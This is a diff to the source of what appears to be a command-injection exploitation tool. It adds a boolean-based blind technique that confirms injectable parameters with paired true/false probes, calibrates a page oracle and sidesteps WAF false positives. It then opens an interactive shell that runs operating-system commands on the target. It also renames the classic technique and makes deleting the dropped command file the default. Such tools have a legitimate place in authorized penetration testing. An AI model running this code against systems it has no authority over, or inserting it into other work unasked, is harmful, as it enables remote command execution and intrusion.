@@ -199,8 +199,10 @@ def delete_previous_shell(separator, TAG, prefix, suffix, whitespace, http_reque
       return
     # '--cleanup' is the answer already given: the file goes without being asked about.
     if not menu.options.cleanup:
-      msg = "Do you want to delete from the target the file ('" + OUTPUT_TEXTFILE + "') used for command execution? [y/N] "
-      if common.read_input(msg, default="N", check_batch=True) not in settings.CHOICE_YES:
+      # Left behind, the file is a working command channel for whoever finds it next - so the
+      # answer that tidies up is the one offered, and '--batch' takes it.
+      msg = "Do you want to delete from the target the file ('" + OUTPUT_TEXTFILE + "') used for command execution? [Y/n] "
+      if common.read_input(msg, default="Y", check_batch=True) not in settings.CHOICE_YES:
         return
     if settings.VERBOSITY_LEVEL != 0:
       debug_msg = "Cleaning up the target operating system (i.e. deleting file '" + OUTPUT_TEXTFILE + "')."
@@ -655,6 +657,169 @@ def _oob_sweep(is_eval, injection_type, prefixes, suffixes, separators, url, tim
   checks.identified_vulnerable_param(url, technique, injection_type, vuln_parameter, payload, http_request_method, filename, 1, checks.finding_title(separator, whitespace, bare_prefix, bare_suffix))
   session_handler.import_injection_points(url, technique, injection_type, filename, separator, True, vuln_parameter, prefix, suffix, TAG, menu.options.interpreter, payload, http_request_method, url_time_response=0, timesec=0, exec_time=0, output_length=0, is_vulnerable=settings.INJECTION_LEVEL)
   return _exploit(separator, prefix, suffix, whitespace, vuln_parameter, transport, TAG)
+
+"""
+Try each boundary until one of them makes the page answer yes to a question it should, and no to one
+it should not.
+
+Two questions with known answers rather than one: a page that says yes to everything says nothing,
+and a boundary that never reached a shell at all would otherwise be read as a finding.
+"""
+def do_boolean_based_process(url, timesec, filename, http_request_method, injection_type, technique):
+
+  payloads = checks.boolean_based_payloads()
+  settings.BOOLEAN_PRINTED_STATE = False
+  from src.core.techniques.boolean_based import bb_injector as injector
+
+  # Registered once the boundary is settled, so the routes that run commands reach this technique.
+  def _exploit(separator, prefix, suffix, whitespace, vuln_parameter, TAG):
+    cmd = maxlen = OUTPUT_TEXTFILE = ""
+    interpreter = menu.options.interpreter
+    _register_post_detection_action(lambda: enumeration.stored_session(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, interpreter, filename, 0, technique))
+    _register_post_detection_action(lambda: file_access.stored_session(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, interpreter, filename, 0, technique))
+    if menu.options.os_cmd:
+      def _run_os_cmd():
+        if settings.OS_CMD_DONE:
+          return
+        settings.OS_CMD_DONE = True
+        enumeration.single_os_cmd_exec(separator, maxlen, TAG, menu.options.os_cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, interpreter, filename, 0, technique)
+      _register_post_detection_action(_run_os_cmd)
+    boolean_based_pseudo_terminal_shell(separator, prefix, suffix, whitespace, vuln_parameter, http_request_method, url, filename, technique)
+    return True
+
+  if menu.options.eval_sink:
+    prefixes, suffixes, separators = checks.eval_prefixes(), settings.EVAL_SUFFIXES, settings.EVAL_SEPARATORS
+  else:
+    prefixes, suffixes, separators = checks.sink_boundaries()
+    separators = checks.chainable_separators(separators)
+  whitespaces = settings.WHITESPACES
+  prefixes, suffixes, separators, whitespaces = _prioritize_confirmed_boundary(prefixes, suffixes, separators, whitespaces)
+
+  TAG = ''.join(random.choice(string.ascii_uppercase) for _ in range(6))
+
+  # One boundary, asked both ways round and then once more - which way the page answers is all this
+  # technique reads, so a boundary that cannot answer both ways has not been shown to run anything.
+  def _answers_both_ways(whitespace, prefix, suffix, separator, TAG):
+    payload = payloads.decision(separator, TAG, len(TAG), holds=True)
+    if not payload:
+      return None
+    vuln_parameter = ""
+    page_true, code_true, vuln_parameter, prefix, suffix = injector.page_of(payload, prefix, suffix, whitespace, http_request_method, url, vuln_parameter)
+    page_false, code_false, vuln_parameter, prefix, suffix = injector.page_of(payloads.decision(separator, TAG, len(TAG), holds=False), prefix, suffix, whitespace, http_request_method, url, vuln_parameter)
+    if not checks.boolean_oracle_given():
+      # A false answer that reads exactly like the page the parameter's own value returns means the
+      # payload changed nothing at all, whatever the two probes look like beside each other.
+      if checks.comparable_page(page_false or "") == checks.comparable_page(settings.ORIGINAL_PAGE or ""):
+        return None
+      # These two pages are what says which answer is which, so the target teaches the oracle first.
+      if not checks.calibrate_boolean_oracle(page_true, page_false, code_true, code_false):
+        return None
+    # Asked both ways round, because a page that says yes to anything is not answering the question.
+    if checks.boolean_oracle(page_true, code_true) is not True:
+      return None
+    if checks.boolean_oracle(page_false, code_false) is not False:
+      return None
+    # A true answer that comes back blocked while the false one is served is the protection talking,
+    # not the target - a real finding reproduces the page the parameter already returns.
+    if str(code_true) in settings.WAF_BLOCK_HTTP_CODES and str(code_false).isdigit() and int(code_false) < 400:
+      warn_msg = "The true and false answers differ only by a blocked HTTP " + str(code_true)
+      warn_msg += " against " + str(code_false) + ", which reads as a protection rather than an injection."
+      settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
+      return None
+    # A boundary that answered both ways round is a candidate, and asking it once more is this
+    # technique's false-positive test - announced the way every other technique announces its own.
+    checks.check_for_false_positive_result(False)
+    # Asked once more, because a page that moves on its own can answer either way by itself.
+    again, _ = injector.answer(payload, prefix, suffix, whitespace, http_request_method, url, vuln_parameter)
+    if again is not True:
+      checks.unexploitable_point()
+      return None
+    return payload, vuln_parameter, prefix, suffix
+
+  """
+  A stored finding says where the injection is, but not what this target's pages look like - and
+  which way a page answers is the whole of the oracle here, calibrated against the target rather
+  than carried in the session. So the stored boundary is asked again, which costs a handful of
+  requests instead of the sweep, and teaches the oracle on the way.
+  """
+  stored_row = settings.STORED_TECHNIQUES.get(technique) if settings.LOAD_SESSION else None
+  if stored_row:
+    try:
+      url, technique, injection_type, separator, shell, vuln_parameter, prefix, suffix, TAG, interpreter, payload, http_request_method, url_time_response, timesec, exec_time, output_length, is_vulnerable = session_handler.apply_stored_technique(stored_row)
+      url, prefix = session_handler.reapply_testable_value(url, vuln_parameter, http_request_method, prefix)
+      checks.check_for_stored_tamper(payload)
+      settings.DETECTION_PHASE = True
+      settings.EXPLOITATION_PHASE = False
+      for printed in ((False,) if menu.options.eval_sink else (False, True)):
+       settings.BOOLEAN_PRINTED_STATE = printed
+       for whitespace, stored_prefix, stored_suffix, stored_separator in _boundary_combinations(whitespaces, [prefix], [suffix], [separator]):
+        confirmed = _answers_both_ways(whitespace, stored_prefix, stored_suffix, stored_separator, TAG)
+        if confirmed:
+          _, vuln_parameter, sent_prefix, sent_suffix = confirmed
+          settings.CONFIRMED_BOUNDARY[settings.CHECKING_PARAMETER] = (stored_prefix, stored_suffix, stored_separator, whitespace)
+          return _exploit(stored_separator, sent_prefix, sent_suffix, whitespace, vuln_parameter, TAG)
+      # The stored boundary no longer answers, so this is a target that has moved rather than a
+      # session to replay - it is tested again from the start, and announced as any first run is.
+      settings.BOOLEAN_PRINTED_STATE = False
+      settings.STORED_TECHNIQUES.pop(technique, None)
+      TAG = ''.join(random.choice(string.ascii_uppercase) for _ in range(6))
+    except TypeError:
+      checks.error_loading_session_file()
+
+  _announce_technique(injection_type, technique)
+
+  """
+  The two ways a page can be made to carry the answer, the cheaper one first.
+
+  A target that branches on the exit status its command left behind answers with the page it renders,
+  and the payload need print nothing at all. One that prints what the command said whatever it said
+  branches nowhere, and the same questions read alike - so the test is made to print a marker of its
+  own, and the page carries that or it does not. The second shape is only reached where the first was
+  shown to say nothing, because a target that branches is answered without adding to its output.
+  """
+  # An evaluation sink halts the target's own code, which shortens the page it renders whether or
+  # not the target branches - so there is nothing the second shape would reach that the first cannot.
+  shapes = (False,) if menu.options.eval_sink else (False, True)
+  for printed in shapes:
+    settings.BOOLEAN_PRINTED_STATE = printed
+    for whitespace, prefix, suffix, separator in _boundary_combinations(whitespaces, prefixes, suffixes, separators):
+      settings.DETECTION_PHASE = True
+      settings.EXPLOITATION_PHASE = False
+      bare_prefix, bare_suffix = prefix, suffix
+      confirmed = _answers_both_ways(whitespace, prefix, suffix, separator, TAG)
+      if not confirmed:
+        continue
+      payload, vuln_parameter, prefix, suffix = confirmed
+      checks.injection_process(injection_type, technique, done=True)
+      settings.CONFIRMED_BOUNDARY[settings.CHECKING_PARAMETER] = (bare_prefix, bare_suffix, separator, whitespace)
+      checks.identified_vulnerable_param(url, technique, injection_type, vuln_parameter, payload, http_request_method, filename, 1, checks.finding_title(separator, whitespace, bare_prefix, bare_suffix))
+      session_handler.import_injection_points(url, technique, injection_type, filename, separator, True, vuln_parameter, prefix, suffix, TAG, menu.options.interpreter, payload, http_request_method, url_time_response=0, timesec=0, exec_time=0, output_length=0, is_vulnerable=settings.INJECTION_LEVEL)
+      return _exploit(separator, prefix, suffix, whitespace, vuln_parameter, TAG)
+
+  settings.BOOLEAN_PRINTED_STATE = False
+  checks.injection_process(injection_type, technique, done=True)
+  return False
+
+"""
+An interactive shell over the content oracle, one command at a time.
+"""
+def boolean_based_pseudo_terminal_shell(separator, prefix, suffix, whitespace, vuln_parameter, http_request_method, url, filename, technique):
+  from src.core.techniques.boolean_based import bb_injector as injector
+
+  # Run one command through the oracle, reusing a stored answer where there is one.
+  def execute_cmd(cmd):
+    stored = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
+    if not menu.options.ignore_session and checks.usable_stored_cmd(stored):
+      return stored
+    shell = injector.injection(separator, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter)
+    logs.executed_command(filename, cmd, shell)
+    if shell and not menu.options.ignore_session:
+      session_handler.store_cmd(url, cmd, shell, vuln_parameter)
+    return shell
+
+  # Reached without going through pseudo_terminal_shell(), so '--proof' is told about it here too.
+  proof.register(technique, vuln_parameter, http_request_method, execute_cmd)
+  return pseudo_terminal_shell_generic(url, filename, technique, False, execute_cmd, separator=separator)
 
 """
 Send an out-of-band payload without waiting around for a response it never reads. Clients on the
@@ -1134,14 +1299,14 @@ def do_results_based_process(url, timesec, filename, http_request_method, inject
   exit_loops = False
   no_result = True
 
-  if technique == settings.INJECTION_TECHNIQUE.CLASSIC:
+  if technique == settings.INJECTION_TECHNIQUE.RESULTS_BASED:
     try:
       import html
       unescape = html.unescape
     except ImportError:  # Python 2
       unescape = _html_parser.HTMLParser().unescape
-    from src.core.techniques.classic import cb_injector as injector
-    from src.core.techniques.classic import cb_payloads as payloads
+    from src.core.techniques.results_based import rb_injector as injector
+    from src.core.techniques.results_based import rb_payloads as payloads
 
   elif technique == settings.INJECTION_TECHNIQUE.DYNAMIC_CODE:
     from src.core.eval import eb_injector as injector
@@ -1175,7 +1340,7 @@ def do_results_based_process(url, timesec, filename, http_request_method, inject
 
   TAG = ''.join(random.choice(string.ascii_uppercase) for i in range(6))
   # Only the classic technique leaves its pipe payloads open, to read the result off the response.
-  combinations = list(_boundary_combinations(whitespaces, prefixes, suffixes, separators, keep_output=technique == settings.INJECTION_TECHNIQUE.CLASSIC, grammar_separators=settings.SEPARATORS))
+  combinations = list(_boundary_combinations(whitespaces, prefixes, suffixes, separators, keep_output=technique == settings.INJECTION_TECHNIQUE.RESULTS_BASED, grammar_separators=settings.SEPARATORS))
   i = 0
   total = len(combinations)
   """
@@ -1226,8 +1391,8 @@ def do_results_based_process(url, timesec, filename, http_request_method, inject
         elif technique == settings.INJECTION_TECHNIQUE.TEMP_FILE_BASED:
           tfb_handler.exploitation(url, timesec, filename, tmp_path, http_request_method, url_time_response)
         else:
-          if technique == settings.INJECTION_TECHNIQUE.CLASSIC:
-            settings.CLASSIC_STATE = True
+          if technique == settings.INJECTION_TECHNIQUE.RESULTS_BASED:
+            settings.RESULTS_BASED_STATE = True
           elif technique == settings.INJECTION_TECHNIQUE.DYNAMIC_CODE:
             settings.EVAL_BASED_STATE = True
           checks.check_for_stored_tamper(payload)
